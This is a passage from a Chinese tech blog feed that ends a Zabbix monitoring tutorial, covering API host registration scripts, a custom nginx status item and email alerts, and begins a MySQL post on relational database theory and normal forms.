null<br>&#125;&#x27; http:<span class="hljs-string">//</span>$&#123;ZABBIX_SERVER&#125;<span class="hljs-string">/zabbix/api_jsonrpc.php</span><br>5）准备通过api添加主机脚本<br>cat zabbix-api_addhost.sh <br><span class="hljs-comment">#!/bin/bash</span><br>ZABBIX_SERVER=10.0.0.129<br>TOKEN=$<span class="hljs-params">(./zabbix-api-token.sh| awk -F&#x27;&quot;&#x27; &#x27;&#123;print $8&#125;&#x27;)</span><br>ACTIVE_IP=10.0.0.128<br>PASSIVE_IP=10.0.0.138<br>active <span class="hljs-params">()</span> &#123;<br>for HOST in $ACTIVE_IP;do<br>curl -s -XPOST -H <span class="hljs-string">&quot;Content-Type: application/json-rpc&quot;</span> -d &#x27;<br>&#123;<br><span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br><span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;host.create&quot;</span>,<br><span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;&#x27;$HOST&#x27;&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&#x27;web-$HOST&#x27;&quot;</span>,<br>    <span class="hljs-string">&quot;proxy_hostid&quot;</span>: <span class="hljs-string">&quot;10442&quot;</span>,<br>    <span class="hljs-string">&quot;interfaces&quot;</span>: [<br>       &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: 1,<br>        <span class="hljs-string">&quot;main&quot;</span>: 1,<br>        <span class="hljs-string">&quot;useip&quot;</span>: 1,<br>        <span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;&#x27;$HOST&#x27;&quot;</span>,<br>        <span class="hljs-string">&quot;dns&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-string">&quot;10050&quot;</span><br>       &#125;<br>   ],<br>    <span class="hljs-string">&quot;groups&quot;</span>: [<br>       &#123;<br>            <span class="hljs-string">&quot;groupid&quot;</span>: <span class="hljs-string">&quot;2&quot;</span><br>       &#125;<br>   ],<br>    <span class="hljs-string">&quot;templates&quot;</span>: [<br>       &#123;<br>            <span class="hljs-string">&quot;templateid&quot;</span>: <span class="hljs-string">&quot;10001&quot;</span><br>       &#125;<br>   ]<br> &#125;,<br><span class="hljs-string">&quot;id&quot;</span>: 1,<br><span class="hljs-string">&quot;auth&quot;</span>: <span class="hljs-string">&quot;&#x27;$TOKEN&#x27;&quot;</span><br>&#125;&#x27; http:<span class="hljs-string">//</span>$&#123;ZABBIX_SERVER&#125;<span class="hljs-string">/zabbix/api_jsonrpc.php</span><br>done<br>&#125;<br><br><br>passive <span class="hljs-params">()</span> &#123;<br>for HOST in $PASSIVE_IP;do<br>curl -s -XPOST -H <span class="hljs-string">&quot;Content-Type: application/json-rpc&quot;</span> -d &#x27;<br>&#123;<br><span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br><span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;host.create&quot;</span>,<br><span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;&#x27;$HOST&#x27;&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&#x27;db-$HOST&#x27;&quot;</span>,<br>    <span class="hljs-string">&quot;interfaces&quot;</span>: [<br>       &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: 1,<br>        <span class="hljs-string">&quot;main&quot;</span>: 1,<br>        <span class="hljs-string">&quot;useip&quot;</span>: 1,<br>        <span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;&#x27;$HOST&#x27;&quot;</span>,<br>        <span class="hljs-string">&quot;dns&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;port&quot;</span>: <span class="hljs-string">&quot;10050&quot;</span><br>       &#125;<br>   ],<br>    <span class="hljs-string">&quot;groups&quot;</span>: [<br>       &#123;<br>            <span class="hljs-string">&quot;groupid&quot;</span>: <span class="hljs-string">&quot;2&quot;</span><br>       &#125;<br>   ],<br>    <span class="hljs-string">&quot;templates&quot;</span>: [<br>       &#123;<br>            <span class="hljs-string">&quot;templateid&quot;</span>: <span class="hljs-string">&quot;10001&quot;</span><br>       &#125;<br>   ]<br> &#125;,<br><span class="hljs-string">&quot;id&quot;</span>: 1,<br><span class="hljs-string">&quot;auth&quot;</span>: <span class="hljs-string">&quot;&#x27;$TOKEN&#x27;&quot;</span><br>&#125;&#x27; http:<span class="hljs-string">//</span>$&#123;ZABBIX_SERVER&#125;<span class="hljs-string">/zabbix/api_jsonrpc.php</span><br>done<br>&#125;<br><br>active<br>passive<br>6）当前主机只要一个server和proxy两台<br><br>7）执行脚本查看结果<br>sh <span class="hljs-string">/data/sh/zabbix-api_addhost.sh</span><br><span class="hljs-comment">###这里看到两台主机一台走代理，一台没走代理。因为是刚加上可用性还没返回数据</span><br><br><br><span class="hljs-comment">###等待一段时间后发现已经上线</span><br></code></pre></td></tr></table></figure><h3 id="4、总结zabbix自定义监控项，基于自定义监控项监控nginx"><a href="#4、总结zabbix自定义监控项，基于自定义监控项监控nginx" class="headerlink" title="4、总结zabbix自定义监控项，基于自定义监控项监控nginx"></a>4、总结zabbix自定义监控项，基于自定义监控项监控nginx</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">4.1</span> 自定义监控项<br><br>监控项键值的格式（包括键值的参数）必须遵循语法规则。<br>UserParameter=&lt;key&gt;,&lt;shell command&gt;<br><br>要构建有效的监控项键值，首先要指定键值的名称，然后选择是否具有参数<br>键值名称<br>Key（键值）名称本身具有字符范围的限制，允许的字符是：<span class="hljs-number">0</span>-<span class="hljs-number">9</span>a-zA-Z_-.<br><br>客户端可以自定义监控项，在Zabbix Agent 配置文件添加内容,格式如下<br><span class="hljs-comment">#cat /etc/zabbix/zabbix_agentd.conf</span><br><span class="hljs-comment">#cat /etc/zabbix/zabbix_agent2.conf</span><br>UserParameter=&lt;key&gt;,&lt;shell command&gt;<br>Include=<span class="hljs-regexp">/etc/</span>zabbix<span class="hljs-regexp">/zabbix_agentd.d/</span>*.conf<br>例：获取根分区的磁盘利用率<br>UserParameter=root_filesystem_use,df|awk -F<span class="hljs-string">&#x27; +|%&#x27;</span> <span class="hljs-string">&#x27;$7 == &quot;/&quot; &#123;print $5 &#125;&#x27;</span><br><br><span class="hljs-number">4.2</span>  自定义监控项监控nginx<br><br><span class="hljs-comment">####先在agent上安装nginx,yum -y install nginx</span><br><span class="hljs-comment">####设置监控页面vim /etc/nginx/nginx.conf</span><br>location /nginx_status &#123;<br>                stub_status;<br>                access_log off;<br>                allow <span class="hljs-number">10.0</span>.<span class="hljs-number">0.129</span>; <span class="hljs-comment">#允许zabbix_server访问</span><br>                allow <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>; <span class="hljs-comment">#允许本机访问</span><br>                deny all; <span class="hljs-comment">#拒绝所有</span><br>        &#125;<br><span class="hljs-comment">####nginx -t 检查语法</span><br><span class="hljs-comment">####nginx -s reload</span><br><br><span class="hljs-number">1</span>）在agent上编写脚本<br>cat <span class="hljs-regexp">/etc/</span>zabbix<span class="hljs-regexp">/zabbix_agent.d/</span>nginx.sh<br><span class="hljs-comment">#!/bin/bash </span><br><br>nginx_status_fun()&#123; <span class="hljs-comment">#函数内容</span><br>NGINX_PORT=<span class="hljs-variable">$1</span> <span class="hljs-comment">#端口，函数的第一个参数是脚本的第二个参数，即脚本的第二个参数是段端口号</span><br>NGINX_COMMAND=<span class="hljs-variable">$2</span> <span class="hljs-comment">#命令，函数的第二个参数是脚本的第三个参数，即脚本的第三个参数是命令</span><br>nginx_active()&#123; <span class="hljs-comment">#获取nginx_active数量，以下相同，这是开启了nginx状态但是只能从本机看到</span><br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| grep <span class="hljs-string">&#x27;Active&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span><br>        &#125;<br>nginx_reading()&#123; <span class="hljs-comment">#获取nginx_reading状态的数量</span><br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| grep <span class="hljs-string">&#x27;Reading&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br>       &#125;<br>nginx_writing()&#123;<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| grep <span class="hljs-string">&#x27;Writing&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span><br>       &#125;<br>nginx_waiting()&#123;<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| grep <span class="hljs-string">&#x27;Waiting&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $6&#125;&#x27;</span><br>       &#125;<br>nginx_accepts()&#123;<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| awk NR==<span class="hljs-number">3</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br>       &#125;<br>nginx_handled()&#123;<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| awk NR==<span class="hljs-number">3</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br>       &#125;<br>nginx_requests()&#123;<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl &quot;http:/</span><span class="hljs-regexp">/127.0.0.1:&quot;$NGINX_PORT&quot;/</span>nginx_status<span class="hljs-regexp">/&quot; 2&gt;/</span>dev/null| awk NR==<span class="hljs-number">3</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span><br>       &#125;<br>  case <span class="hljs-variable">$NGINX_COMMAND</span> <span class="hljs-keyword">in</span><br>active)<br>nginx_active;<br>;;<br>reading)<br>nginx_reading;<br>;;<br>writing)<br>nginx_writing;<br>;;<br>waiting)<br>nginx_waiting;<br>;;<br>accepts)<br>nginx_accepts;<br>;;<br>handled)<br>nginx_handled;<br>;;<br>requests)<br>nginx_requests;<br>esac <br>&#125;<br><br>main()&#123; <span class="hljs-comment">#主函数内容</span><br>case <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span> <span class="hljs-comment">#分支结构，用于判断用户的输入而进行响应的操作</span><br>nginx_status) <span class="hljs-comment">#当输入nginx_status就调用nginx_status_fun，并传递第二和第三个参数</span><br>nginx_status_fun <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span>;<br>;;<br>*) <span class="hljs-comment">#其他的输入打印帮助信息</span><br>echo $<span class="hljs-string">&quot;Usage: $0 &#123;nginx_status key&#125;&quot;</span><br>esac <span class="hljs-comment">#分支结束符</span><br>&#125;<br><br>main <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span><br><br><span class="hljs-number">2</span>)cat <span class="hljs-regexp">/etc/</span>zabbix/zabbix_agent.conf<br>UserParameter=nginx.status[*],<span class="hljs-regexp">/etc/</span>zabbix<span class="hljs-regexp">/zabbix_agent2.d/</span>nginx.sh <span class="hljs-string">&quot;$1&quot;</span> <span class="hljs-string">&quot;$2&quot;</span> <span class="hljs-string">&quot;$3&quot;</span><br><br><span class="hljs-number">3</span>)重启agent<br>systemctl restart zabbix_agent.service<br><br><span class="hljs-number">4</span>)在zabbix_server上测试是否拿到数据<br>zabbix_get -s <span class="hljs-number">10.0</span>.<span class="hljs-number">0.128</span> -k nginx.status[<span class="hljs-string">&quot;nginx_statux&quot;</span>,<span class="hljs-number">80</span>,<span class="hljs-string">&quot;active&quot;</span>]<br><br><span class="hljs-number">5</span>)在zabbix_server的web页面上添加模板和监控项<br><br><br><span class="hljs-comment">####创建监控项，这里创建一个，其他的克隆即可</span><br><br><br><span class="hljs-comment">####创建监控端口的监控项</span><br><br><br><br><span class="hljs-comment">####创建触发器</span><br><br><br><span class="hljs-comment">####创建图形</span><br><br><span class="hljs-comment">####模板创建完成</span><br><br><span class="hljs-comment">####主机内关联模板</span><br><br><br><span class="hljs-comment">####查看最新数据及图形</span><br><br><br><br><br><span class="hljs-comment">####nginx自定义监控创建完成</span><br></code></pre></td></tr></table></figure><h3 id="5、基于zabbix实现邮件或微信告警"><a href="#5、基于zabbix实现邮件或微信告警" class="headerlink" title="5、基于zabbix实现邮件或微信告警"></a>5、基于zabbix实现邮件或微信告警</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">1)使用163邮箱获取授权码</span><br><span class="language-xml"></span><br><span class="language-xml">2）管理--&gt;报警媒介类型--&gt;创建报警媒介类型</span><br><span class="language-xml"></span><br><span class="language-xml">3）添加报警信息模板用于发送信息</span><br><span class="language-xml"></span><br><span class="language-xml">#可以修改两个消息模板</span><br><span class="language-xml"># 问题</span><br><span class="language-xml">主题: 告警: </span><span class="hljs-template-variable">&#123;EVENT.NAME&#125;</span><span class="language-xml"></span><br><span class="language-xml">告警主机：</span><span class="hljs-template-variable">&#123;HOST.NAME1&#125;</span><span class="language-xml"></span><br><span class="language-xml">告警服务: </span><span class="hljs-template-variable">&#123;ITEM.NAME1&#125;</span><span class="language-xml"></span><br><span class="language-xml">告警Key1: </span><span class="hljs-template-variable">&#123;ITEM.KEY1&#125;</span><span class="language-xml">：</span><span class="hljs-template-variable">&#123;ITEM.VALUE1&#125;</span><span class="language-xml"></span><br><span class="language-xml">告警Key2: </span><span class="hljs-template-variable">&#123;ITEM.KEY2&#125;</span><span class="language-xml">：</span><span class="hljs-template-variable">&#123;ITEM.VALUE2&#125;</span><span class="language-xml"></span><br><span class="language-xml">严重级别: </span><span class="hljs-template-variable">&#123;TRIGGER.SEVERITY&#125;</span><span class="language-xml"></span><br><span class="language-xml"># 恢复 Problem Recovery</span><br><span class="language-xml">主题: 恢复: </span><span class="hljs-template-variable">&#123;EVENT.DURATION&#125;</span><span class="language-xml">: </span><span class="hljs-template-variable">&#123;EVENT.NAME&#125;</span><span class="language-xml"></span><br><span class="language-xml">恢复主机：</span><span class="hljs-template-variable">&#123;HOST.NAME1&#125;</span><span class="language-xml"></span><br><span class="language-xml">恢复服务： </span><span class="hljs-template-variable">&#123;ITEM.NAME1&#125;</span><span class="language-xml"></span><br><span class="language-xml">恢复Key1：</span><span class="hljs-template-variable">&#123;ITEM.KEY1&#125;</span><span class="language-xml">：</span><span class="hljs-template-variable">&#123;ITEM.VALUE1&#125;</span><span class="language-xml"></span><br><span class="language-xml">恢复Key2: </span><span class="hljs-template-variable">&#123;ITEM.KEY2&#125;</span><span class="language-xml">：</span><span class="hljs-template-variable">&#123;ITEM.VALUE2&#125;</span><span class="language-xml"></span><br><span class="language-xml">4）添加完后测试是否可收到邮件</span><br><span class="language-xml"></span><br><span class="language-xml">#收到邮件</span><br><span class="language-xml"></span><br><span class="language-xml">5）配置用户的收件邮箱和使用的动作</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#默认动作</span><br><span class="language-xml"></span><br><span class="language-xml">6）停止nginx和启动nginx，查看是否发送故障和恢复邮件。上面自定义监控项里已设置80端口触发器</span><br><span class="language-xml">systemctl stop nginx</span><br><span class="language-xml"></span><br><span class="language-xml">systemctl start nginx</span><br><span class="language-xml"></span><br><span class="language-xml">###邮箱收到的邮件列表</span><br></code></pre></td></tr></table></figure><h3 id="6、总结zabbix自动发现监控"><a href="#6、总结zabbix自动发现监控" class="headerlink" title="6、总结zabbix自动发现监控"></a>6、总结zabbix自动发现监控</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">之前都是手动一台一台主机的添加到 Zabbix 中进行监控,很是繁琐,可以利用自动发现功能,自动添加被监控的主机，当众多的服务器都已经安装了agent或者snmp后，利用自动发现功能,Zabbix server 可以自动扫描预先配置好的<span class="hljs-built_in">ip</span>段，自动添加主机，自动关联模板，自动加到主机组里等等。<br>网络发现功能更快速的部署zabbix、简化zabbix管理、并且在经常变动的环境里面也不需要花太多的精力，毕竟网络发现也能随时发现变化。<br>当然网络发现也不是万能的,虽然网络发现能干很多事情，但是它无法发现网络拓扑的变化。由于自动发现效率比较低,严重消耗Zabbix Server资源和网络带宽,大规模环境中较少使用自动发现虽然能自动完成发现并添加主机，但仍然存在一些问题<br><span class="hljs-number">1</span>）发现时间长，效率较低<br><span class="hljs-number">2</span>）扫描过程中容易漏扫<br><span class="hljs-number">3</span>）当<span class="hljs-built_in">IP</span>地址不固定难以实现<br><span class="hljs-number">4</span>）无法实现不同类型主机关联不同模板<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL实战</title>
    <link href="/2023/07/28/MYSQL%E5%AE%9E%E6%88%98/"/>
    <url>/2023/07/28/MYSQL%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="一、数据库原理"><a href="#一、数据库原理" class="headerlink" title="一、数据库原理"></a>一、数据库原理</h1><h2 id="1-数据的分类"><a href="#1-数据的分类" class="headerlink" title="1 数据的分类"></a>1 数据的分类</h2><blockquote><ul><li>结构化的数据：即有固定格式和有限长度的数据。例如填的表格就是结构化的数据，国籍：中华人民共和国，民族：汉，性别：男，这都叫结构化数据</li><li>非结构化的数据：非结构化的数据越来越多，就是不定长、无固定格式的数据，例如: 网页,图片文件，有时候非常大，有时候很小；例如语音，视频都是非结构化的数据</li><li>半结构化数据：比如：XML或者HTML的格式的数据</li></ul></blockquote><hr><h2 id="2-数据库的发展史"><a href="#2-数据库的发展史" class="headerlink" title="2 数据库的发展史"></a>2 数据库的发展史</h2><blockquote><ul><li>萌芽阶段：文件系统</li></ul><p>    使用磁盘文件来存储数据</p><ul><li>初级阶段：第一代数据库</li></ul><p>    出现了网状模型、层次模型的数据库</p><ul><li>中级阶段：第二代数据库</li></ul><p>    关系型数据库和结构化查询语言</p><ul><li>高级阶段：新一代数据库</li></ul><p>    “关系-对象”型数据库</p></blockquote><hr><h2 id="3-数据库管理系统"><a href="#3-数据库管理系统" class="headerlink" title="3 数据库管理系统"></a>3 数据库管理系统</h2><h3 id="3-1-相关概念"><a href="#3-1-相关概念" class="headerlink" title="3.1 相关概念"></a>3.1 相关概念</h3><blockquote><p>Database：数据库是数据的汇集，它以一定的组织形式存于存储介质上</p><p><strong>DBMS：Database Management System, 是管理数据库的系统软件，它实现数据库系统的各种功能。是数据库系统的核心</strong></p><p>DBA：Database Administrator, 负责数据库的规划、设计、协调、维护和管理等工作</p><p>Application：应用程序,指以数据库为基础的应用程序</p></blockquote><h3 id="3-2-数据库管理系统的优点"><a href="#3-2-数据库管理系统的优点" class="headerlink" title="3.2 数据库管理系统的优点"></a>3.2 数据库管理系统的优点</h3><blockquote><ul><li>程序与数据相互独立</li><li>保证数据的安全、可靠</li><li>最大限度地保证数据的正确性</li><li>数据可以并发使用并能同时保证一致性</li><li>相互关联的数据的集合</li><li>较少的数据冗余</li></ul></blockquote><h4 id="3-2-1-RDBMS-关系型数据库"><a href="#3-2-1-RDBMS-关系型数据库" class="headerlink" title="3.2.1 RDBMS 关系型数据库"></a>3.2.1 RDBMS 关系型数据库</h4><blockquote><p>Relational Database Management System,关系模型最初由IBM公司的英国计算机科学家埃德加·科德(Edgar F. Codd)于1969年描述1974年，IBM开始开发系统R，这是一个开发RDBMS原型的研究项目。然而，第一个商业上可用的RDBMS是甲骨文，于1979年由关系软件（现为甲骨文oracle公司）发布</p></blockquote><h5 id="3-2-1-1-关系统型数据库相关概念"><a href="#3-2-1-1-关系统型数据库相关概念" class="headerlink" title="3.2.1.1 关系统型数据库相关概念"></a>3.2.1.1 关系统型数据库相关概念</h5><blockquote><ul><li>关系Relational ：关系就是二维表，其中：表中的行、列次序并不重要</li><li><strong>行row：表中的每一行，又称为一条记录record</strong></li><li><strong>列column：表中的每一列，称为属性，字段，域field</strong></li><li><strong>主键Primary key：PK ,一个或多个字段的组合, 用于惟一确定一个记录的字段，一张表只有一个主键, 主键字段不能为空NULL</strong></li><li><strong>唯一键Unique key: 一个或多个字段的组合,用于惟一确定一个记录的字段,一张表可以有多个UK,而且UK字段可以为NULL</strong></li><li><strong>域domain：属性的取值范围，如，性别只能是’男’和’女’两个值，人类的年龄只能0-150</strong></li></ul></blockquote><h5 id="3-2-1-2常用关系数据库"><a href="#3-2-1-2常用关系数据库" class="headerlink" title="3.2.1.2常用关系数据库"></a>3.2.1.2常用关系数据库</h5><blockquote><ul><li>MySQL: MySQL, MariaDB, Percona Server</li><li>PostgreSQL: 简称为pgsql，EnterpriseDB</li><li>Oracle</li><li>MSSQL Server</li><li>DB2</li></ul></blockquote><p><a href="https://db-engines.com/en/ranking">数据库排行</a></p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221023135818720-1923411036.png"><img src="2927659-20221023135818720-1923411036.png" alt="img"></a></p><hr><h2 id="4-关系型数据库理论"><a href="#4-关系型数据库理论" class="headerlink" title="4 关系型数据库理论"></a>4 关系型数据库理论</h2><h3 id="4-1-实体-联系模型E-R"><a href="#4-1-实体-联系模型E-R" class="headerlink" title="4.1 实体-联系模型E-R"></a>4.1 实体-联系模型E-R</h3><h3 id="4-2-联系类型"><a href="#4-2-联系类型" class="headerlink" title="4.2 联系类型"></a>4.2 联系类型</h3><blockquote><ul><li>一对一联系(1:1): 在表A或表B中创建一个字段﹐存储另一个表的主键值 如: 一个人只有一个身份证</li><li>一对多联系(1:n)：外键, 如: 部门和员工</li><li>多对多联系(m:n)：增加第三张表, 如: 学生和课程</li></ul></blockquote><h3 id="4-3-数据的操作"><a href="#4-3-数据的操作" class="headerlink" title="4.3 数据的操作"></a>4.3 数据的操作</h3><blockquote><p>开发工程师 CRUD (增加Create、查询Read或 Retrieve、更新Update、 删除Delete)</p><ul><li>数据提取：在数据集合中提取感兴趣的内容。SELECT</li><li>数据更新：变更数据库中的数据。INSERT、DELETE、UPDATE</li></ul></blockquote><h3 id="4-4-数据库的正规化分析"><a href="#4-4-数据库的正规化分析" class="headerlink" title="4.4 数据库的正规化分析"></a>4.4 数据库的正规化分析</h3><blockquote><ul><li>数据库规范化，又称数据库或资料库的正规化、标准化，是数据库设计中的一系列原理和技术，以减少数据库中数据冗余，增进数据的一致性。关系模型的发明者埃德加·科德最早提出这一概念，并于1970年代初定义了第一范式、第二范式和第三范式的概念</li><li>设计关系数据库时，遵从不同的规范要求，设计出合理的关系型数据库，不同的规范要求被称为不同范式，各种范式呈递次规范，<strong>越高的范式数据库冗余越小</strong></li><li> 目前关系数据库有六种范式：第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、巴德斯科范式（BCNF）、第四范式(4NF）和第五范式（5NF，又称完美范式）。满足最低要求的范式是第一范式（1NF）。在第一范式的基础上进一步满足更多规范要求的称为第二范式（2NF），其余范式以次类推。一般数据库只需满足第三范式(3NF）即可</li><li>规则是死的,人是活的,所以<strong>范式是否必须遵守,要看业务需要而定</strong></li><li>掌握范式的目的是为了在合适的场景下违反范式</li></ul></blockquote><h4 id="4-4-1-第一范式：1NF"><a href="#4-4-1-第一范式：1NF" class="headerlink" title="4.4.1 第一范式：1NF"></a>4.4.1 第一范式：1NF</h4><blockquote><p>无重复的列，每一列都是不可分割的基本数据项，同一列中不能有多个值，即实体中的某个属性不能有多个值或者不能有重复的属性，确保每一列的原子性。除去同类型的字段，就是无重复的列</p><p>说明：第一范式（1NF）是对关系模式的基本要求，不满足第一范式（1NF）的数据库就不是关系数据库</p></blockquote><h4 id="4-4-2-第二范式：2NF"><a href="#4-4-2-第二范式：2NF" class="headerlink" title="4.4.2 第二范式：2NF"></a>4.4.2 第二范式：2NF</h4><blockquote><p>第二范式必须先满足第一范式，属性完全依赖于主键，要求表中的每个行必须可以被唯一地区分，通常为表加上每行的唯一标识主键PK，非PK的字段需要与整个PK有直接相关性,即非PK的字段不能依赖于部分主键</p></blockquote><h4 id="4-4-3-第三范式：3NF"><a href="#4-4-3-第三范式：3NF" class="headerlink" title="4.4.3 第三范式：3NF"></a>4.4.3 第三范式：3NF</h4><blockquote><p>满足第三范式必须先满足第二范式属性，非主键属性不依赖于其它非主键属性。第三范式要求一个数据表中不包含已在其它表中已包含的非主关键字信息，非PK的字段间不能有从属关系</p></blockquote><h3 id="4-5-SQL-结构化查询语言简介"><a href="#4-5-SQL-结构化查询语言简介" class="headerlink" title="4.5 SQL 结构化查询语言简介"></a>4.5 SQL 结构化查询语言简介</h3><blockquote><p>SQL：Structure Query 